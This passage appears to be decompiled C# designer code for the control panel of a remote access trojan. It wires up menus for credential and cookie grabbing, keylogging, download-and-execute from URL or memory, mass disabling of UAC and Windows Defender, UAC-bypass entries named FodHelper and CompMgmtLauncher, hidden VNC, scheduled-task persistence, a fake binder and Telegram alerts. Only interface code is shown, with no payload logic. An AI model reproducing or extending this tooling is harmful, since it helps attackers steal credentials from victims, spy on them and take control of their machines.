		this.SchTaskInstallStubMenu.Caption = "Task Schedule Install";
		this.SchTaskInstallStubMenu.Id = 51;
		this.SchTaskInstallStubMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("SchTaskInstallStubMenu.ImageOptions.SvgImage");
		this.SchTaskInstallStubMenu.Name = "SchTaskInstallStubMenu";
		this.SchTaskInstallStubMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SchTaskInstallStubMenu_ItemClick);
		this.SchTaskUnInstallStubMenu.Caption = "Task Scheduler Uninstall";
		this.SchTaskUnInstallStubMenu.Id = 52;
		this.SchTaskUnInstallStubMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("SchTaskUnInstallStubMenu.ImageOptions.SvgImage");
		this.SchTaskUnInstallStubMenu.Name = "SchTaskUnInstallStubMenu";
		this.SchTaskUnInstallStubMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SchTaskUnInstallStubMenu_ItemClick);
		this.barSubItem8.Caption = "Password Recovery";
		this.barSubItem8.Id = 14;
		this.barSubItem8.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("barSubItem8.ImageOptions.SvgImage");
		this.barSubItem8.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[4]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.DisableRecoveryMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.LoadRecoveryInfoMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.LoadAnalyzedInfoMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.LoadGeneralInfoMenu)
		});
		this.barSubItem8.Name = "barSubItem8";
		this.DisableRecoveryMenu.Caption = "Discord Recovery";
		this.DisableRecoveryMenu.Id = 45;
		this.DisableRecoveryMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("DisableRecoveryMenu.ImageOptions.Image");
		this.DisableRecoveryMenu.Name = "DisableRecoveryMenu";
		this.DisableRecoveryMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(DisableRecoveryMenu_ItemClick);
		this.LoadRecoveryInfoMenu.Caption = "Recovery Info";
		this.LoadRecoveryInfoMenu.Id = 56;
		this.LoadRecoveryInfoMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("LoadRecoveryInfoMenu.ImageOptions.Image");
		this.LoadRecoveryInfoMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("LoadRecoveryInfoMenu.ImageOptions.LargeImage");
		this.LoadRecoveryInfoMenu.Name = "LoadRecoveryInfoMenu";
		this.LoadRecoveryInfoMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(LoadRecoveryInfoMenu_ItemClick);
		this.LoadAnalyzedInfoMenu.Caption = "Grabber Info";
		this.LoadAnalyzedInfoMenu.Id = 57;
		this.LoadAnalyzedInfoMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("LoadAnalyzedInfoMenu.ImageOptions.Image");
		this.LoadAnalyzedInfoMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("LoadAnalyzedInfoMenu.ImageOptions.LargeImage");
		this.LoadAnalyzedInfoMenu.Name = "LoadAnalyzedInfoMenu";
		this.LoadAnalyzedInfoMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(LoadAnalyzedInfoMenu_ItemClick);
		this.LoadGeneralInfoMenu.Caption = "General Info";
		this.LoadGeneralInfoMenu.Id = 55;
		this.LoadGeneralInfoMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("LoadGeneralInfoMenu.ImageOptions.SvgImage");
		this.LoadGeneralInfoMenu.Name = "LoadGeneralInfoMenu";
		this.LoadGeneralInfoMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(LoadGeneralInfoMenu_ItemClick);
		this.AddNoteMenu.Caption = "Add Note";
		this.AddNoteMenu.Id = 15;
		this.AddNoteMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("AddNoteMenu.ImageOptions.SvgImage");
		this.AddNoteMenu.Name = "AddNoteMenu";
		this.AddNoteMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(AddNoteMenu_ItemClick);
		this.GotoSettingMenu.Caption = "Telegram Notification";
		this.GotoSettingMenu.Id = 16;
		this.GotoSettingMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("GotoSettingMenu.ImageOptions.SvgImage");
		this.GotoSettingMenu.Name = "GotoSettingMenu";
		this.GotoSettingMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(GotoSettingMenu_ItemClick);
		this.barSubItem9.Caption = "Download and Execute";
		this.barSubItem9.Id = 25;
		this.barSubItem9.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("barSubItem9.ImageOptions.SvgImage");
		this.barSubItem9.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[3]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.SendFileToMemoryMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.SendFileFromUrlMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.SendFileToDiskMenu)
		});
		this.barSubItem9.Name = "barSubItem9";
		this.SendFileToMemoryMenu.Caption = "Execute to Memory";
		this.SendFileToMemoryMenu.Id = 61;
		this.SendFileToMemoryMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("SendFileToMemoryMenu.ImageOptions.Image");
		this.SendFileToMemoryMenu.Name = "SendFileToMemoryMenu";
		this.SendFileToMemoryMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SendFileToMemoryMenu_ItemClick);
		this.SendFileFromUrlMenu.Caption = "Execute From URL";
		this.SendFileFromUrlMenu.Id = 59;
		this.SendFileFromUrlMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("SendFileFromUrlMenu.ImageOptions.Image");
		this.SendFileFromUrlMenu.Name = "SendFileFromUrlMenu";
		this.SendFileFromUrlMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SendFileFromUrlMenu_ItemClick);
		this.SendFileToDiskMenu.Caption = "Execute to Disk";
		this.SendFileToDiskMenu.Id = 60;
		this.SendFileToDiskMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("SendFileToDiskMenu.ImageOptions.Image");
		this.SendFileToDiskMenu.Name = "SendFileToDiskMenu";
		this.SendFileToDiskMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SendFileToDiskMenu_ItemClick);
		this.KeyLogMenu.Caption = "Advanced Keylogger";
		this.KeyLogMenu.Id = 30;
		this.KeyLogMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("KeyLogMenu.ImageOptions.SvgImage");
		this.KeyLogMenu.Name = "KeyLogMenu";
		this.KeyLogMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(KeyLogMenu_ItemClick);
		this.ReverseProxyMenu.Caption = "Reverse Proxy";
		this.ReverseProxyMenu.Id = 32;
		this.ReverseProxyMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("ReverseProxyMenu.ImageOptions.SvgImage");
		this.ReverseProxyMenu.Name = "ReverseProxyMenu";
		this.ReverseProxyMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ReverseProxyMenu_ItemClick);
		this.FunMenu.Caption = "Fun System";
		this.FunMenu.Id = 33;
		this.FunMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("FunMenu.ImageOptions.Image");
		this.FunMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("FunMenu.ImageOptions.LargeImage");
		this.FunMenu.Name = "FunMenu";
		this.FunMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(FunMenu_ItemClick);
		this.barSubItem10.Caption = "Connection Control";
		this.barSubItem10.Id = 34;
		this.barSubItem10.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("barSubItem10.ImageOptions.SvgImage");
		this.barSubItem10.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[4]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.StopStubMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RestartStubMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.UpdateStubMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.UninstallStubMenu)
		});
		this.barSubItem10.Name = "barSubItem10";
		this.StopStubMenu.Caption = "Disconnect";
		this.StopStubMenu.Id = 38;
		this.StopStubMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("StopStubMenu.ImageOptions.SvgImage");
		this.StopStubMenu.Name = "StopStubMenu";
		this.StopStubMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(StopStubMenu_ItemClick);
		this.RestartStubMenu.Caption = "Reconnect";
		this.RestartStubMenu.Id = 39;
		this.RestartStubMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("RestartStubMenu.ImageOptions.SvgImage");
		this.RestartStubMenu.Name = "RestartStubMenu";
		this.RestartStubMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RestartStubMenu_ItemClick);
		this.UpdateStubMenu.Caption = "Update";
		this.UpdateStubMenu.Id = 41;
		this.UpdateStubMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("UpdateStubMenu.ImageOptions.SvgImage");
		this.UpdateStubMenu.Name = "UpdateStubMenu";
		this.UpdateStubMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(UpdateStubMenu_ItemClick);
		this.UninstallStubMenu.Caption = "Uninstall";
		this.UninstallStubMenu.Id = 42;
		this.UninstallStubMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("UninstallStubMenu.ImageOptions.SvgImage");
		this.UninstallStubMenu.Name = "UninstallStubMenu";
		this.UninstallStubMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(UninstallStubMenu_ItemClick);
		this.NoSystemStubMenu.Caption = "No System";
		this.NoSystemStubMenu.Id = 40;
		this.NoSystemStubMenu.Name = "NoSystemStubMenu";
		this.NoSystemStubMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(NoSystemStubMenu_ItemClick);
		this.ClientFolderMenu.Caption = "Client Folder";
		this.ClientFolderMenu.Id = 43;
		this.ClientFolderMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("ClientFolderMenu.ImageOptions.SvgImage");
		this.ClientFolderMenu.Name = "ClientFolderMenu";
		this.ClientFolderMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ClientFolderMenu_ItemClick);
		this.FodHelperMenu.Caption = "FodHelper";
		this.FodHelperMenu.Id = 48;
		this.FodHelperMenu.Name = "FodHelperMenu";
		this.FodHelperMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(FodHelperMenu_ItemClick);
		this.CompLauncherMenu.Caption = "CompMgmtLauncher";
		this.CompLauncherMenu.Id = 50;
		this.CompLauncherMenu.Name = "CompLauncherMenu";
		this.CompLauncherMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(CompLauncherMenu_ItemClick);
		this.NormalInstallStubMenu.Caption = "Normal Install";
		this.NormalInstallStubMenu.Id = 53;
		this.NormalInstallStubMenu.Name = "NormalInstallStubMenu";
		this.NormalInstallStubMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(NormalInstallStubMenu_ItemClick);
		this.NormalUnInstallStubMenu.Caption = "Normal Uninstall";
		this.NormalUnInstallStubMenu.Id = 54;
		this.NormalUnInstallStubMenu.Name = "NormalUnInstallStubMenu";
		this.NormalUnInstallStubMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(NormalUnInstallStubMenu_ItemClick);
		this.LoadKeyLogInfoMenu.Caption = "Download Offline Keylogger";
		this.LoadKeyLogInfoMenu.Id = 58;
		this.LoadKeyLogInfoMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("LoadKeyLogInfoMenu.ImageOptions.SvgImage");
		this.LoadKeyLogInfoMenu.Name = "LoadKeyLogInfoMenu";
		this.LoadKeyLogInfoMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(LoadKeyLogInfoMenu_ItemClick);
		this.SaveAllPassword.Caption = "Save All Password";
		this.SaveAllPassword.Id = 62;
		this.SaveAllPassword.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("SaveAllPassword.ImageOptions.SvgImage");
		this.SaveAllPassword.Name = "SaveAllPassword";
		this.SaveAllPassword.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SaveAllPassword_ItemClick);
		this.SaveAllCookies.Caption = "Save All Cookies";
		this.SaveAllCookies.Id = 63;
		this.SaveAllCookies.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("SaveAllCookies.ImageOptions.SvgImage");
		this.SaveAllCookies.Name = "SaveAllCookies";
		this.SaveAllCookies.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SaveAllCookies_ItemClick);
		this.SaveAllHistory.Caption = "Save All History";
		this.SaveAllHistory.Id = 64;
		this.SaveAllHistory.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("SaveAllHistory.ImageOptions.SvgImage");
		this.SaveAllHistory.Name = "SaveAllHistory";
		this.SaveAllHistory.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SaveAllHistory_ItemClick);
		this.SaveAllAutoFill.Caption = "Save All AutoFill";
		this.SaveAllAutoFill.Id = 65;
		this.SaveAllAutoFill.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("SaveAllAutoFill.ImageOptions.SvgImage");
		this.SaveAllAutoFill.Name = "SaveAllAutoFill";
		this.SaveAllAutoFill.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SaveAllAutoFill_ItemClick);
		this.SaveAllBookmarks.Caption = "Save All Bookmarks";
		this.SaveAllBookmarks.Id = 66;
		this.SaveAllBookmarks.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("SaveAllBookmarks.ImageOptions.SvgImage");
		this.SaveAllBookmarks.Name = "SaveAllBookmarks";
		this.SaveAllBookmarks.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SaveAllBookmarks_ItemClick);
		this.RefreshRecoveryMenu.Caption = "Refresh";
		this.RefreshRecoveryMenu.Id = 67;
		this.RefreshRecoveryMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("RefreshRecoveryMenu.ImageOptions.Image");
		this.RefreshRecoveryMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("RefreshRecoveryMenu.ImageOptions.LargeImage");
		this.RefreshRecoveryMenu.Name = "RefreshRecoveryMenu";
		this.RefreshRecoveryMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RefreshRecovery_ItemClick);
		this.Task_SendFileFromUrl.Caption = "Mass Execute URL";
		this.Task_SendFileFromUrl.Id = 68;
		this.Task_SendFileFromUrl.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("Task_SendFileFromUrl.ImageOptions.Image");
		this.Task_SendFileFromUrl.Name = "Task_SendFileFromUrl";
		this.Task_SendFileFromUrl.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(Task_SendFileFromUrl_ItemClick);
		this.TaskSendFileTODiskMenu.Caption = "Mass Execute to Disk";
		this.TaskSendFileTODiskMenu.Id = 69;
		this.TaskSendFileTODiskMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskSendFileTODiskMenu.ImageOptions.Image");
		this.TaskSendFileTODiskMenu.Name = "TaskSendFileTODiskMenu";
		this.TaskSendFileTODiskMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskSendFileTODiskMenu_ItemClick);
		this.TaskSendFileToMemoryMenu.Caption = "Mass Execute To Momory";
		this.TaskSendFileToMemoryMenu.Id = 70;
		this.TaskSendFileToMemoryMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskSendFileToMemoryMenu.ImageOptions.Image");
		this.TaskSendFileToMemoryMenu.Name = "TaskSendFileToMemoryMenu";
		this.TaskSendFileToMemoryMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskSendFileToMemoryMenu_ItemClick);
		this.TaskDisableUACMenu.Caption = "Mass Disable UAC";
		this.TaskDisableUACMenu.Id = 71;
		this.TaskDisableUACMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskDisableUACMenu.ImageOptions.Image");
		this.TaskDisableUACMenu.Name = "TaskDisableUACMenu";
		this.TaskDisableUACMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskDisableUACMenu_ItemClick);
		this.TaskDisableWDMenu.Caption = "Mass Disable WD";
		this.TaskDisableWDMenu.Id = 72;
		this.TaskDisableWDMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskDisableWDMenu.ImageOptions.Image");
		this.TaskDisableWDMenu.Name = "TaskDisableWDMenu";
		this.TaskDisableWDMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskDisableWDMenu_ItemClick);
		this.TaskInstallSchTaskMenu.Caption = "Mass Install Task Schedule";
		this.TaskInstallSchTaskMenu.Id = 73;
		this.TaskInstallSchTaskMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskInstallSchTaskMenu.ImageOptions.Image");
		this.TaskInstallSchTaskMenu.Name = "TaskInstallSchTaskMenu";
		this.TaskInstallSchTaskMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskInstallSchTaskMenu_ItemClick);
		this.TaskUpdateAllMenu.Caption = "Mass Update";
		this.TaskUpdateAllMenu.Id = 74;
		this.TaskUpdateAllMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskUpdateAllMenu.ImageOptions.Image");
		this.TaskUpdateAllMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("TaskUpdateAllMenu.ImageOptions.LargeImage");
		this.TaskUpdateAllMenu.Name = "TaskUpdateAllMenu";
		this.TaskUpdateAllMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskUpdateAllMenu_ItemClick);
		this.TaskAutoKeyloggerMenu.Caption = "Mass Offline Keylogger";
		this.TaskAutoKeyloggerMenu.Id = 75;
		this.TaskAutoKeyloggerMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskAutoKeyloggerMenu.ImageOptions.Image");
		this.TaskAutoKeyloggerMenu.Name = "TaskAutoKeyloggerMenu";
		this.TaskAutoKeyloggerMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskAutoKeyloggerMenu_ItemClick);
		this.TaskFakeBinderMenu.Caption = "FakeBinder";
		this.TaskFakeBinderMenu.Id = 76;
		this.TaskFakeBinderMenu.Name = "TaskFakeBinderMenu";
		this.TaskFakeBinderMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskFakeBinderMenu_ItemClick);
		this.TaskDeleteMenu.Caption = "Remove Task";
		this.TaskDeleteMenu.Id = 77;
		this.TaskDeleteMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskDeleteMenu.ImageOptions.Image");
		this.TaskDeleteMenu.Name = "TaskDeleteMenu";
		this.TaskDeleteMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskDeleteMenu_ItemClick);
		this.TaskLoadStealDataMenu.Caption = "Mass Load Grabber Data";
		this.TaskLoadStealDataMenu.Id = 78;
		this.TaskLoadStealDataMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskLoadStealDataMenu.ImageOptions.Image");
		this.TaskLoadStealDataMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("TaskLoadStealDataMenu.ImageOptions.LargeImage");
		this.TaskLoadStealDataMenu.Name = "TaskLoadStealDataMenu";
		this.TaskLoadStealDataMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskLoadStealDataMenu_ItemClick);
		this.TaskLoadRecoveryDataMenu.Caption = "Mass Load Recovery Data";
		this.TaskLoadRecoveryDataMenu.Id = 79;
		this.TaskLoadRecoveryDataMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskLoadRecoveryDataMenu.ImageOptions.Image");
		this.TaskLoadRecoveryDataMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("TaskLoadRecoveryDataMenu.ImageOptions.LargeImage");
		this.TaskLoadRecoveryDataMenu.Name = "TaskLoadRecoveryDataMenu";
		this.TaskLoadRecoveryDataMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskLoadRecoveryDataMenu_ItemClick);
		this.StartScreenMenu.Caption = "Enable";
		this.StartScreenMenu.Id = 80;
		this.StartScreenMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("StartScreenMenu.ImageOptions.Image");
		this.StartScreenMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("StartScreenMenu.ImageOptions.LargeImage");
		this.StartScreenMenu.Name = "StartScreenMenu";
		this.StartScreenMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(StartScreenMenu_ItemClick);
		this.StopScreenMenu.Caption = "Disable";
		this.StopScreenMenu.Id = 81;
		this.StopScreenMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("StopScreenMenu.ImageOptions.Image");
		this.StopScreenMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("StopScreenMenu.ImageOptions.LargeImage");
		this.StopScreenMenu.Name = "StopScreenMenu";
		this.StopScreenMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(StopScreenMenu_ItemClick);
		this.ClearLogMenu.Caption = "Delete Logs";
		this.ClearLogMenu.Id = 82;
		this.ClearLogMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("ClearLogMenu.ImageOptions.Image");
		this.ClearLogMenu.Name = "ClearLogMenu";
		this.ClearLogMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ClearLogMenu_ItemClick);
		this.SelectAllMenu.Caption = "Select All";
		this.SelectAllMenu.Id = 83;
		this.SelectAllMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("SelectAllMenu.ImageOptions.SvgImage");
		this.SelectAllMenu.Name = "SelectAllMenu";
		this.SelectAllMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(SelectAllMenu_ItemClick);
		this.OpenHvncMenu.Caption = "Open HVNC";
		this.OpenHvncMenu.Id = 84;
		this.OpenHvncMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("OpenHvncMenu.ImageOptions.SvgImage");
		this.OpenHvncMenu.Name = "OpenHvncMenu";
		this.OpenHvncMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(OpenHvncMenu_ItemClick);
		this.CopyIpMenu.Caption = "Copy IP Address";
		this.CopyIpMenu.Id = 85;
		this.CopyIpMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("CopyIpMenu.ImageOptions.Image");
		this.CopyIpMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("CopyIpMenu.ImageOptions.LargeImage");
		this.CopyIpMenu.Name = "CopyIpMenu";
		this.CopyIpMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(CopyIpMenu_ItemClick);
		this.barSubItem11.Caption = "System Control";
		this.barSubItem11.Id = 86;
		this.barSubItem11.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("barSubItem11.ImageOptions.SvgImage");
		this.barSubItem11.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[2]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem4),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem10)
		});
		this.barSubItem11.Name = "barSubItem11";
		this.barSubItem12.Caption = "Keylogger";
		this.barSubItem12.Id = 87;
		this.barSubItem12.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("barSubItem12.ImageOptions.Image");
		this.barSubItem12.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[5]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.KeyLogMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TimerKeyLogStartMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TimerKeyLogStopMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TimerKeyLogSettingMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.LoadKeyLogInfoMenu)
		});
		this.barSubItem12.Name = "barSubItem12";
		this.TimerKeyLogStartMenu.Caption = "Start";
		this.TimerKeyLogStartMenu.Id = 89;
		this.TimerKeyLogStartMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TimerKeyLogStartMenu.ImageOptions.Image");
		this.TimerKeyLogStartMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("TimerKeyLogStartMenu.ImageOptions.LargeImage");
		this.TimerKeyLogStartMenu.Name = "TimerKeyLogStartMenu";
		this.TimerKeyLogStartMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TimerKeyLogStartMenu_ItemClick);
		this.TimerKeyLogStopMenu.Caption = "Stop";
		this.TimerKeyLogStopMenu.Id = 90;
		this.TimerKeyLogStopMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TimerKeyLogStopMenu.ImageOptions.Image");
		this.TimerKeyLogStopMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("TimerKeyLogStopMenu.ImageOptions.LargeImage");
		this.TimerKeyLogStopMenu.Name = "TimerKeyLogStopMenu";
		this.TimerKeyLogStopMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TimerKeyLogStopMenu_ItemClick);
		this.TimerKeyLogSettingMenu.Caption = "Settings Timer";
		this.TimerKeyLogSettingMenu.Id = 91;
		this.TimerKeyLogSettingMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("TimerKeyLogSettingMenu.ImageOptions.SvgImage");
		this.TimerKeyLogSettingMenu.Name = "TimerKeyLogSettingMenu";
		this.TimerKeyLogSettingMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TimerKeyLogSettingMenu_ItemClick);
		this.TaskOfflineKeylogMenu.Caption = "Offline Keylogger";
		this.TaskOfflineKeylogMenu.Id = 88;
		this.TaskOfflineKeylogMenu.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("TaskOfflineKeylogMenu.ImageOptions.Image");
		this.TaskOfflineKeylogMenu.ImageOptions.LargeImage = (System.Drawing.Image)resources.GetObject("TaskOfflineKeylogMenu.ImageOptions.LargeImage");
		this.TaskOfflineKeylogMenu.Name = "TaskOfflineKeylogMenu";
		this.TaskOfflineKeylogMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskOfflineKeylogMenu_ItemClick);
		this.TaskTimerKeylogMenu.Caption = "Mass Timer Keylogger";
		this.TaskTimerKeylogMenu.Id = 92;
		this.TaskTimerKeylogMenu.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("TaskTimerKeylogMenu.ImageOptions.SvgImage");
		this.TaskTimerKeylogMenu.Name = "TaskTimerKeylogMenu";
		this.TaskTimerKeylogMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(TaskTimerKeylogMenu_ItemClick);
		this.gridControlClient.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlClient.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlClient.Font = new System.Drawing.Font("Tahoma", 4.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.gridControlClient.Location = new System.Drawing.Point(0, 0);
		this.gridControlClient.MainView = this.gridViewClient;
		this.gridControlClient.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlClient.MenuManager = this.barManager1;
		this.gridControlClient.Name = "gridControlClient";
		this.gridControlClient.Size = new System.Drawing.Size(1430, 593);
		this.gridControlClient.TabIndex = 10;
		this.gridControlClient.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewClient });
		this.gridControlClient.MouseUp += new System.Windows.Forms.MouseEventHandler(gridControlClient_Mouse_Up);
		this.gridViewClient.ActiveFilterEnabled = false;
		this.gridViewClient.Appearance.FocusedCell.BackColor = System.Drawing.Color.Green;
		this.gridViewClient.Appearance.FocusedCell.Options.UseBackColor = true;
		this.gridViewClient.Appearance.FocusedRow.BackColor = System.Drawing.Color.Green;
		this.gridViewClient.Appearance.FocusedRow.Options.UseBackColor = true;
		this.gridViewClient.Appearance.GroupRow.BorderColor = System.Drawing.Color.Gray;
		this.gridViewClient.Appearance.GroupRow.Options.UseBorderColor = true;
		this.gridViewClient.Appearance.HeaderPanel.BorderColor = System.Drawing.Color.Green;
		this.gridViewClient.Appearance.HeaderPanel.Options.UseBorderColor = true;
		this.gridViewClient.Appearance.HorzLine.BackColor = System.Drawing.Color.Green;
		this.gridViewClient.Appearance.HorzLine.Options.UseBackColor = true;
		this.gridViewClient.Appearance.SelectedRow.BackColor = System.Drawing.Color.Green;
